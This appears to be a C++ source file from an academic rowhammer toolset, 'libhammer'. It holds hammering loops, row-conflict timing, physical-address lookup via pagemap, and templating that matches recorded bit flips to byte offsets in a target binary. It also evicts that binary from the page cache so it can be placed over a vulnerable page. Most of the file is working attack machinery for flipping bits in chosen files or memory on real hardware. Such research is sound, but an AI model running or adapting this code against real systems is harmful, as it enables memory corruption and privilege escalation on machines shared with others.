#define _LIBHAMMER_EXTERNS
#include "libhammer-packed.h"
/*
    libhammer - viktor's rowhammer toolset, compact version
    
    repo: https://github.com/xulai1001/rhjs-new

    ISLAB 2018-2021
*/

//-------------------------------
// global/static vars
//-------------------------------
clk_t clk_freq = -1;
int fd_pagemap = -1;
AddrMap addrmap;
map<int, vector<HammerResult> > result_pool;
static set<uint64_t> paset;

//-------------------------------
// timing.c
//-------------------------------
// baseline test
clk_t clock_overhead(int type)
{
    struct myclock cl;
    clk_t i, sum=0;
    // warmup
    for (i=0; i<10; ++i)
    {
        START_CLOCK(cl, type);
        END_CLOCK(cl);
        sum += cl.ns;
    }
    sum = 0;
    // test
    for (i=0; i<100; ++i)
    {
        START_CLOCK(cl, type);
        END_CLOCK(cl);
        sum += cl.ns;
    }
    return sum/100;
}

clk_t tsc_overhead(void)
{
    struct myclock cl;
    clk_t i, sum=0;
    //warmup
    for (i=0; i<10; ++i)
    {
        START_TSC(cl);
        END_TSC(cl);
        sum += cl.ticks;
    }
    sum = 0;
    //test
    for (i=0; i<1000; ++i)
    {
        START_TSC(cl);
        END_TSC(cl);
        if (cl.ticks < 100)     // rule out big values
            sum += cl.ticks;
    }
    return sum/1000;
}

clk_t tsc_measure_freq(void)
{
    struct myclock cl;
//    printf("tsc_measure_freq...");
    START_TSC(cl);
    usleep(1000000);
    END_TSC(cl);
//    printf("%ld MHz(Mticks/sec)\n", cl.ticks / 1000000);
    return cl.ticks;
}

clk_t tsc_to_ns(clk_t ticks)
{
    if (clk_freq<0) clk_freq = tsc_measure_freq();
    return ticks * 1000000000 / clk_freq;    
}

//-------------------------------
// memory.c
//-------------------------------
// note: before calling v2p, v should be in memory
uint64_t v2p(void *v) {
    if (getuid() != 0) return -1; // returns when not root

    if (fd_pagemap < 0) ASSERT((fd_pagemap = open("/proc/self/pagemap", O_RDONLY)) > 0);
    uint64_t vir_page_idx = (uint64_t)v / PAGE_SIZE;      // 虚拟页号
    uint64_t page_offset = (uint64_t)v % PAGE_SIZE;       // 页内偏移
    uint64_t pfn_item_offset = vir_page_idx*sizeof(uint64_t);   // pagemap文件中对应虚拟页号的偏移

    // 读取pfn
    uint64_t pfn_item, pfn;
    ASSERT( lseek(fd_pagemap, pfn_item_offset, SEEK_SET) != -1 );
    ASSERT( read(fd_pagemap, &pfn_item, sizeof(uint64_t)) == sizeof(uint64_t) );
    pfn = pfn_item & PFN_MASK;              // 取低55位为物理页号
    return pfn * PAGE_SIZE + page_offset;
}

//---------------------------------
// hammer function. returns operation time (ticks)
uint64_t hammer_loop(void *va, void *vb, int n, int delay)
{
    struct myclock clk;
    register int i = n, j;

    START_TSC(clk);
    while (i--) {
        j = delay;
        HAMMER(va, vb);
        while (j-- > 0);
    }
    END_TSC(clk);

    return clk.ticks;
}

uint64_t hammer_loop_mfence(void *va, void *vb, int n, int delay)
{
    struct myclock clk;
    register int i = n, j;

    START_TSC(clk);
    while (i--) {
        j = delay;
        HAMMER(va, vb);
        MFENCE;
        while (j-- > 0);
    }
    END_TSC(clk);

    return clk.ticks;
}

// equivalent to usenix 16 obf latency routine
// test 10 times & return min value
uint64_t hammer_latency(void *va, void *vb)
{
    unsigned min = 999, n=3, tmp;
    while (min > 400)
    {
        n=3;
        while (n-- > 0)
        {
            tmp = hammer_loop_mfence(va, vb, 3, 0) / (3*2);
            tmp = hammer_loop_mfence(va, vb, 3, 0) / (3*2);
            if (tmp<min) min = tmp;
        }
    }
    // printf("%u ", min);
    return min;
}

#define ROW_CONFLICT_THRESHOLD 233
int is_conflict(void *va, void *vb)
{
    return hammer_latency(va, vb) >= ROW_CONFLICT_THRESHOLD;
}

//-------------------------------
// page.cpp / addrmap.cpp
// - implements class Page / AddrMap
//-----------------------------------------
Page::~Page()
{
    //cout << "dtor" << endl;
    if (shmid > 0 && v.use_count()<=1)   // ?
    {
        // if using acquire_shared and the page (v) has been released
        // remove shm file here
        char fname[2048];
        sprintf(fname, "/dev/shm/page_%ld", shmid);
        unlink(fname);
        // printf("removing shm page file %s\n", fname);
    }
}

// invoked by shared_ptr deleter
void Page::_release(char *ptr)
{
    if (ptr)
    {
        //printf("- release 0x%lx\n", (uint64_t)ptr);
        munmap(ptr, PAGE_SIZE);
        ++release_count;
    }
}


// explicitly release a page
void Page::reset()
{
    //cout << inspect() << endl;
    if (shmid > 0 && v.use_count()<=1)
    {
        char fname[2048];
        sprintf(fname, "/dev/shm/page_%ld", shmid);
        unlink(fname);
        //printf("removing shm page file %s\n", fname);
    }
    if (locked) unlock();
    v.reset();
}

void Page::acquire()
{
    ptr = (char *)mmap(0, PAGE_SIZE, PROT_READ | PROT_WRITE,
                                 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    ASSERT(ptr != MAP_FAILED);
    ASSERT(mlock(ptr, PAGE_SIZE) != -1);

    //v.reset(page, this->_release);  // cannot wrap here, will disturb mmap
    if (getuid()==0) p = v2p(ptr);             // get paddr when root
    //printf("+ acquire v=0x%lx, p=0x%lx\n", (uint64_t)page, p);
}

void Page::acquire_shared(uint64_t sid)
{
    char fname[2048];
    int fd, unused;

    // build filename
    if (sid==0) sid = shm_index++;
    shmid = sid;
    sprintf(fname, "/dev/shm/page_%ld", sid);

    // create/open shared page file
    ASSERT((fd = open(fname, O_CREAT | O_RDWR, 0666)) > 0);
    lseek(fd, PAGE_SIZE, SEEK_SET);
    unused = write(fd, "", 1);

    // mmap
    ptr = (char *)mmap(0, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    ASSERT(ptr != MAP_FAILED);
    // ASSERT(mlock(ptr, PAGE_SIZE) != -1);

    // alter permissions
    close(fd);
    chmod(fname, 0666);

//    v.reset(page_shared, this->_release);   // cannot wrap here, will disturb mmap
    if (getuid()==0) p = v2p(ptr);              // get phys addr when root
    // printf("+ acquire v=0x%lx, p=0x%lx, path=%s\n", (uint64_t)ptr, p, fname);

}

void Page::lock()
{
    ASSERT(mlock(ptr, PAGE_SIZE) != -1);
    locked = true;
}

void Page::unlock()
{
    munlock(ptr, PAGE_SIZE);
    locked = false;
}

bool Page::operator<(Page &b)
{
    return (p>0 && b.p>0) ? p<b.p : (uint64_t)v.get() < (uint64_t)b.v.get();
}

bool Page::operator==(Page &b)
{
    return (p>0 && b.p>0) ? p == b.p : (uint64_t)v.get() == (uint64_t)b.v.get();
}

string Page::inspect()
{
    stringstream ss;
    ss << "<Page v=0x" << hex << (uint64_t)v.get() << " p=0x" << p;
    if (shmid>0) ss << " path=/dev/shm/page_" << dec << shmid;
    ss << dec << ">";
    return ss.str();
}

vector<int> Page::check_bug(uint8_t good)
{
    vector<int> ret;
    uint8_t *buf = (uint8_t *)v.get();
    for (int i=0; i<PAGE_SIZE; ++i)
        if (buf[i] != good) ret.push_back(i);
    return ret;
}

uint64_t Page::shm_index = 1, Page::release_count = 0;

// page allocator
//----------------------------
vector<Page> allocate_mb(int mb)
{
    vector<Page> ret;
    cerr << "- allocate "<< mb << "M memory" << endl;
    ret.resize(mb*256);

    for (int i=0; i<mb*256; ++i)
    {
        ret[i].acquire();
        // ret[i].get<int>(0) = i;  // write to the page
        if ((i+1) % (256*16) == 0) { cerr << "."; cerr.flush(); }  // 16MB/1G indicator
        if ((i+1) % (256*1024) == 0) cerr << endl;
    }
    for (int i=0; i<mb*256; ++i) ret[i].wrap();

    cerr << endl;
    sort(ret.begin(), ret.end());   // sort by paddr

    return ret;
}

vector<Page> get_contiguous_aligned_page(vector<Page> & pageset)
{
    vector<Page> ret;
    vector<int> chunk_length;
    int max_len=0, max_idx=0, i;
    int start_idx, st, order;

    chunk_length.resize(pageset.size());

    for (i=0; i<pageset.size(); ++i)
    {
        if (i>0 && pageset[i].p - pageset[i-1].p == PAGE_SIZE)
            chunk_length[i] = chunk_length[i-1] + 1;
        else chunk_length[i] = 1;

        if (chunk_length[i] > max_len)
        {
            max_len = chunk_length[i]; max_idx = i;
            // cout << hex << pageset[i].p << " " << dec << chunk_length[i] << endl;
        }
    }
    start_idx = max_idx - max_len + 1;
    order = 32 - __builtin_clz(max_len);
    st = -1;
    // cout << start_idx << " " << max_len << " " << order << endl;
    while (st<0 && order>0)
    {
        order--;
        for (i=start_idx; i<=max_idx - (1 << order)+1; ++i)
            if (__builtin_ffsll(pageset[i].p) >= order+PAGE_SHIFT+1)    // aligned to (order+12) bits
            {
                st = i; break;
            }
    }

    for (i=st; i<st+(1<<order); ++i)
        ret.push_back(pageset[i]);

    cerr << "- CAP is " << ret.size() << " pages " << ret.size()/256 << " MB, paddr "
         << hex << ret[0].p << "-" << ret.back().p+0xfff << endl;
    return ret;
}

vector<Page> allocate_cap(int pageset_mb)
{
    vector<Page> pool, ret;

    pool = allocate_mb(pageset_mb);
    ret = get_contiguous_aligned_page(pool);

    int count=0;
    for (auto p : pool)
        if (p < ret[0] || ret.back() < p)
        {
            ++count; p.reset();
        }
    cerr << dec << count << " unused page released." << endl;
    return ret;
}

void release_pageset(vector<Page> & pageset)
{
    for (auto p : pageset) p.reset();
}
/*
// unit test
//----------------------------
void _test_alloc()
{
    auto pages = allocate_cap(1200);
    cout << "freed " << Page::release_count << " pages" << endl;
    release_pageset(pages);
    cout << "freed " << Page::release_count << " pages" << endl;
}

void _test_page()
{
    cout << get_cpu_model() << endl;
    vector<Page> pp;
    for (int i=0; i<10; ++i)
    {
        Page p;
        p.acquire_shared();
        cout << p.inspect() << endl;
        pp.push_back(p);
    }
    for (int i=0; i<10; ++i)
        pp[i].reset();
    cout << "freed " << dec << Page::release_count << " pages" << endl;
}

#ifdef UNIT_TEST
int main(void) {
    if (getuid()==0) _test_alloc();
    _test_page();
    return 0;
}
#endif
*/
void AddrMap::add(Page &pg)
{
    v2p_map[pg.v.get()] = pg.p;
    p2v_map[pg.p] = pg.v.get();
    //page_map[pg.p] = pg;
}
// add to v2p_map & p2v_map
void AddrMap::add(vector<Page> &pageset)
{
    for (auto pg : pageset) add(pg);
}
// only add to page_map, not v2p/p2v map
void AddrMap::add_pagemap(vector<Page> &pageset)
{
    for (auto pg : pageset)
        page_map[pg.p] = pg;
}

//-------------------------------
// templating.cpp
//-------------------------------
void HammerResult::print_header()
{
    cout << "base,offset,p,q,value,flip_to,flips_page,flips_row" << endl;
}

void HammerResult::print()
{
    cout << "0x" << hex << base << "," << dec << offset
         << hex << ",0x" << p << ",0x" << q << ",0x" << value << "," << flip_to
         << "," << dec << flips_page << "," << flips_row << endl;
}

HammerResult::HammerResult(const string& s)
{
    stringstream ss; ss.clear();
    char c; //comma
    ss << s;
    ss >> hex >> base >> c >> dec >> offset >> c >> hex >> p >> c >> q >> c >> value >> c >> dec >> flip_to;
    if (!ss.eof())
        ss >> c >> dec >> flips_page >> c >> flips_row;
}

void load_hammer_result(const string& fname)
{
    ifstream ifs(fname);
    string str;
    int cnt = 0;

    result_pool.clear();

    getline(ifs, str);  // remove title line
    while (getline(ifs, str))
    {
        ++cnt;
        HammerResult result(str);
        // result.print();
        if (result_pool.count(result.offset) == 0)
            result_pool[result.offset] = vector<HammerResult>();
        result_pool[result.offset].push_back(result);
    }
    cerr << "- " << dec << cnt << " templates loaded." << endl;
}

vector<HammerResult> find_template(const BinaryInfo &info)
{
    int page_offset = info.offset & 0xfff;
    vector<HammerResult> ret;

    if (result_pool.count(page_offset) == 0)
    {
        cerr << "- can't find template with page offset=" << dec << page_offset << endl;
        return ret;
    }

    unsigned b = (info.flip_to == 0 ? 0xff : 0);
    for (HammerResult r : result_pool[page_offset])
    {
        r.print();
        if (r.flip_to == info.flip_to &&
            ((r.value ^ b) == (info.orig ^ info.target)))
            {
                ret.push_back(r);
                //is_paddr_available(r.base);
            }
    }
    cerr << "- found " << dec << ret.size() << " templates." << endl;
    return ret;
}

vector<HammerResult> find_flips(uint64_t p, uint64_t q)
{
    vector<HammerResult> ret;
    for (auto it : result_pool)
    {
        for (HammerResult hr : it.second)
            if (hr.p == p && hr.q == q)
                ret.push_back(hr);
    }
    return ret;
}

//-------------------------------
// utils.cpp
//-------------------------------
// get mem/cpu info
uint64_t get_meminfo(const string &key)
{
    stringstream cmd, ss;
    uint64_t ret;
    cmd << "awk '$1 == \"" << key << ":\" { print $2 }' /proc/meminfo";
    ss << run_cmd(cmd.str().c_str()); ss >> ret;
    return ret * 1024;
}

uint64_t get_mem_size()
{
    struct sysinfo info;
    sysinfo(&info);
    return (size_t)info.totalram * (size_t)info.mem_unit;
}

uint64_t get_cached_mem()
{
    return get_meminfo("Cached");
}

uint64_t get_available_mem()
{
    return get_meminfo("MemAvailable");
}

void set_cpu_affinity(int x)
{
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(x, &mask);
    ASSERT((sched_setaffinity(0, sizeof(mask), &mask)) != -1);
}

string run_cmd(const char *cmd)
{
    static FILE* pipe;
    char buf[2048];
    stringstream ss;
    // cout << "cmd: " << cmd << endl;
    ASSERT(pipe = popen(cmd, "r"));
    while (!feof(pipe))
        if (fgets(buf, 2048, pipe) != 0)
            ss << buf;
    pclose(pipe);

    return ss.str();
}

// needs ruby support!
string get_cpu_model()
{
    return run_cmd("ruby -e \"STDOUT.write \\`cat /proc/cpuinfo\\`.lines.map{|l| l.split(':')}.find{|x| x[0]['model name']}[1].chomp.split(' ')[2]\"");
}

// error handling stub
void continuation(void *a, void *b, void *c)
{
    printf("segfault at 0x%lx", (uint64_t)a);
    exit(-1);
}
/*
int handler(void *faddr, int s)
{
    sigsegv_leave_handler(&continuation, faddr, 0, 0);
    return 1;
}
*/

uint64_t get_binary_pa(const string &path, uint64_t offset)
{
    int fd;
    unsigned sz;
    struct stat st;
    void *image;
    uint64_t ret;

    ASSERT(-1 != (fd = open(path.c_str(), O_RDONLY)) );
    fstat(fd, &st);
    sz = st.st_size;

    ASSERT(0 != (image = mmap(0, sz, PROT_READ, MAP_PRIVATE, fd, 0)) );
    mlock(image, sz);
    ret = v2p(image+offset);

    munlock(image, sz);
    close(fd);
    munmap(image, sz);
    return ret;
}

/*
void waylaying()
{
    uint64_t i, cached_ns, uncached_ns;
    char *memfile=0;
    int fd;
    uint64_t memfile_size;
    struct stat st;
    volatile uint64_t tmp = 0;
    myclock clk, cl2;

    // open eviction file
    ASSERT(-1 != (fd = open("/tmp/libhammer/disk/memfile", O_RDONLY | O_DIRECT)) );
    fstat(fd, &st);
    memfile_size = st.st_size;
    ASSERT(0 != (memfile = mmap(0, memfile_size, PROT_READ | PROT_EXEC, MAP_PRIVATE, fd, 0)) );

    // cout << "- start eviction" << endl;
    START_CLOCK(cl2, CLOCK_MONOTONIC);
    for (i=0; i<memfile_size; i+=PAGE_SIZE)
    {
        START_CLOCK(clk, CLOCK_MONOTONIC);
        tmp += *(volatile uint64_t *)(memfile + i);
        END_CLOCK(clk);

        if (i>0 && i % (1<<26)==0) {
           if (clk.ns < 150)
                cout << "-";
           else if (clk.ns < 1000)
                cout << ".";
           else
                cout << "+";
           cout.flush();

        }

    }
    END_CLOCK(cl2);
    cout << endl;
    close(fd);
    munmap(memfile, memfile_size);
}
*/
// use fadvise to do waylaying!
void relocate_fadvise(const string& path)
{
    int fbin;
    struct stat st;

    ASSERT(-1 != (fbin = open(path.c_str(), O_RDONLY)) );
    fstat(fbin, &st);
    ASSERT(0 == posix_fadvise(fbin, 0, st.st_size, POSIX_FADV_DONTNEED));
    close(fbin);
}

uint64_t to_mb(uint64_t b)
{
    return b / 1024000ul;
}
/*
bool is_paddr_available(uint64_t pa)
{
    bool ret = false;
    uint64_t avail_size, pool_size, i, tmp=0;

    avail_size = get_available_mem();
    pool_size = (uint64_t)(avail_size * 0.9);
    pool_size -= pool_size % PAGE_SIZE;
//    cout << blue << "- Available mem: " << _mb(avail_size) << "M, pool size: " << _mb(pool_size) << "M." << endl;

    {
        vector<Page> pool = allocate_mb(to_mb(pool_size));

        for (Page pg : pool)
        {
            pg.get<uint64_t>(0) = pg.p; // access

            if (pg.p == pa)
            {
                cout << "- pa=" << hex << pg.p << " is available." << endl;
                ret = true;
                break;
            }
        }
    }
    if (!ret) cout << "- pa=" << hex << pa << " not available." << endl;

    return ret;
}
*/
uint64_t v2p_once(void *v) {
    int fd_pgmap;

    if (getuid() != 0) return -1; // returns when not root

    ASSERT((fd_pgmap = open("/proc/self/pagemap", O_RDONLY)) > 0);
    uint64_t vir_page_idx = (uint64_t)v / PAGE_SIZE;      // 虚拟页号
    uint64_t page_offset = (uint64_t)v % PAGE_SIZE;       // 页内偏移
    uint64_t pfn_item_offset = vir_page_idx*sizeof(uint64_t);   // pagemap文件中对应虚拟页号的偏移

    // 读取pfn
    uint64_t pfn_item, pfn;
    ASSERT( lseek(fd_pgmap, pfn_item_offset, SEEK_SET) != -1 );
    ASSERT( read(fd_pgmap, &pfn_item, sizeof(uint64_t)) == sizeof(uint64_t) );
    pfn = pfn_item & PFN_MASK;              // 取低55位为物理页号

    close(fd_pgmap);
    return pfn * PAGE_SIZE + page_offset;
}

void interrupt(int sig)
{
    static bool invoked = false;
    int master_pgid = getpgid(0);

    if (!invoked)
    {
        invoked = true;
        cout << "** Interrupted, sending SIGINT to group... **" << endl;
        kill(-master_pgid, SIGINT);
    }
    else
        cout << "- interrupt() already invoked on main process" << endl;
    exit(0);
}

void interrupt_child(int sig)
{
    cout << "-- Interrupted. pid=" << dec << getpid() << endl;
    exit(0);
}
/*
ImageFile do_chasing(const string &path, uint64_t addr)
{
    uint64_t i, step=0, pa;
    int fd, w, tmp;
    char *image;
    unsigned sz;
    struct stat st;
    const uint64_t free_mb = get_available_mem() / 1024000;
    const int master_pgid = getpgid(0);

    ImageFile ret;
    ret.image = image;
    ret.name = path;
    ret.sz = sz;

    // 1. mmap the file image with private and r/w access
    ASSERT(-1 != (fd = open(path.c_str(), O_RDONLY)) );
    fstat(fd, &st);
    sz = st.st_size;
    ASSERT(0 != (image = mmap(0, sz, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) );
    // make sure the image is loaded into memory.
    *(volatile uint64_t *)image = 0;
    signal(SIGINT, interrupt);

    while (true)
    {
        // 2. fork
        if (fork() != 0)
        {
            // parent: relocate
            // any write to shared page will cause relocation, either from parent or child. so parent write is also OK.
            *(volatile uint64_t *)image = ++step;
            // insert into set
            pa = v2p_once(image);
            paset.insert(pa);
            // analyse
            cout << "step=" << dec << step << ", image=" << hex << pa
                 << ", coverage=" << dec << paset.size()/256 << "M / " << free_mb << "M" << endl;
            // wait for child to exit
            //wait(&i);
            usleep(1000);
        }
        else
        {
            setpgid(0, master_pgid);
            signal(SIGINT, interrupt_child);

            char *buf = mmap(0, 8192000, PROT_READ |PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
            int sum = 0;
            for (i=0; i<8192000; i+=PAGE_SIZE)
            {
                sum += *(volatile int *)(buf+i);
            }
            // child: wait & quit
            usleep(200000);
            munmap(buf, 8192000);
            break;
        }
    }

    // cleanup
    munmap(image, sz);
    close(fd);
    ret.image = 0;
    // cout << "- exit: step " << dec << step << " pid=" << getpid() << endl;

    return ret;
}
*/
void DiskUsage::get_diskstat()
{
    stringstream cmd, ss;
    cmd << "awk '$3 == \"" << disk << "\" { print $13 }' /proc/diskstats";
    ss << run_cmd(cmd.str().c_str()); ss >> value;
}

void DiskUsage::init(string d)
{
    START_CLOCK(clk, CLOCK_MONOTONIC);
    START_CLOCK(clk_total, CLOCK_MONOTONIC);
    disk = d; usage = 0;
    get_diskstat();
}

void DiskUsage::update()
{
    uint64_t last_value = value, ms;
    get_diskstat();
    END_CLOCK(clk);
    END_CLOCK(clk_total);
    ms = clk.ns / 1000000;
    usage = (value - last_value) * 1000 / ms;
    START_CLOCK(clk, CLOCK_MONOTONIC);
}
